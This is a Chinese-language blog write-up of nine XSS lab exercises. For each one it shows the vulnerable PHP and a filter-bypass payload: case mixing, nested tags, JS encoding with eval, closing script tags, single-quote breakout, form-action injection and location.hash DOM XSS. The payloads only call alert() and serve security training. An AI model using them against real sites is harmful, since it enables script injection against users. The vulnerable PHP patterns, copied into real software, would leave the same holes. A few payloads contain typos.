---
layout: default
category: Web安全
tags: [xss, Web安全]
---

### 知识储备

常见的XSS测试语句：

```js
<script>alert(1)</script>
<img src='1' onerror='alert(1)'>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
<iframe src=javascript:alert(1)><iframe>
...
```

### 第1题： 无过滤

**payload:**

```js
<script>alert(hey)</script>
```

php代码：

```php
    <?php   
        echo $_GET["name"];  
    ?> 
```

### 第二题：大小写绕过

该题目过滤了小写的`<script> </script>`标签，可通过大小写绕过

**payload:**

```js
<Script>alert(1)</sCript>
<iframe src=javascript:alert(1)><iframe>
<img src='1' onerror='alert(1)'>
<a href=javascript:alert(1)>
...
```

php代码

```php
<?php   
    $name = $_GET["name"];  
    $name = preg_replace("/<script>/", "", $name);  
    $name = preg_replace("/<\/script>/", "", $name);  
    echo $name;  
?>  
```

### 第三题：双写绕过

输入`<Script>alert(1)</sCript>`, 发现`<script>等`标签被过滤了，但是`alert(1)`还在，可知大小写的`<script> </script>`标签都过滤，考虑双写绕过

payload:

```js
<Scr<script>ipt>alert(1)</scr</script>ipt>
当然还有：
<iframe src=javascript:alert(1)><iframe>
<img src='1' onerror='alert(1)'>
...
```

php代码：

```php
<?php   
    $name = $_GET["name"];  
    $name = preg_replace("/<script>/i", "", $name);  
    $name = preg_replace("/<\/script>/i", "", $name);  
    echo $name;  
?>  
```

### 第四题：尝试其他标签`<img>`，`<a>`

输入`<Script>alert(1)</sCript>`,发现会产生ERROR，输入`<> </>`等，但是并没有过滤，那就尝试其他标签，如`<img>`, `<a>`等

payload：

```
<img src='1' onerror='alert(1)'>
<a href=javascript:alert(1)>
...
```

### 第五题：编码绕过

输入`<Script>alert(1)</sCript>`，`<img src='1' onerror='alert(1)'>`， 都会产生error，有的时候，服务器会对一些关键词进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval()来实现。eval()会将编码过的语句解码后再执行。

常见的编码：JS编码、HTML实体编码、url编码...

**解法一：**

alert(1)编码过后就是\u0061\u006c\u0065\u0072\u0074(1)，

payload：

```js
<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>
```

**解法二：**

使用`String.fromCharCode()` alert('xxs')的十进制为`97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59`

payload：

```js
<script>eval(Strinf.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59))</script>
...
```

### 第六题：闭合标签

查看源码发现我们输出的hacker作为了一个变量赋值给了a，并且这个变量在`<script>`这个标签中这样的话，只要能够突破这个赋值的变量，就可以利用这个`<script>`这个标签来弹窗了。
payload：

```js
12";</script><img src=1 onerror=alert('xss')><script>
"; b=alert('xss');eval(b);//
...
```

来查看下源码来简单的分析一下:

```js
Hello 
<script>
    var $a= "12";</script><img src=1 onerror=alert('xss')><script>";
</script>
```

payload最前面的11";`</script> `闭合了前面的`<script>`标签最后面的`<script>` 闭合了后面的`<script>`标签中间的`<img src=1 onerror=alert('xss')>`用来触发弹窗事件.

### 第七题：单引号绕过

输入payload：`"; b=alert('xss');eval(b);//` 发现并没有弹窗，吓出一身冷汗，赶紧查看源代码

```js
<script>
	var $a= '"; b=alert('xss');eval(b);//';
</script>
```

得知并没有过滤`alert()`, 过滤了双引号，那么就换成单引号绕过嘛

payload：

```js
'; b=alert('xss');eval(b);//
```

Php代码

```php
<script>  
    var $a = "<?php echo htmlentities($_GET["name"]); ?>";  
<script>  
// htmlentities并没有过滤单引号   
```

### 第八题

通过查看源码：

```js
<form action="/xss/example8.php" method="POST">
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/>
```

点击提交后还是跳转到本url进行处理，满腔热血地输入payload`<img src='1' onerror='alert(1)'>`等，结果令人失望，但是发现并没有过滤`<  > _`等符号，想到第七题，再来个闭合标签，构造payload

```
http://192.168.244.140/xss/example8.php/"method="POST"><script>alert(1)</script>
```

并不是在input标签输入，哪里会转移字符的。

查看源码：

```
<form action="/xss/example8.php/"method="POST"><script>alert(1)</script>" method="POST">
```

`/"method="POST">`闭合了之前的标签，然后在后添加`<script>`标签。

### 第九题

在源码中完全找不到hacker的任何字样，于是仔细百度最可疑的地方:

```js
<script>
  document.write(location.hash.substring(1));
</script>
```

`location.hash.substring(1)`函数的作用是输出当前页面url锚部分（从 # 号开始的部分）。

构造payload：

```js
#<script>alert(1)</script>
```

### 后记

在实际运用中漏洞的利用可能不会这么直观，需要我们不断的尝试，甚至组合各种绕过方式来达到目的。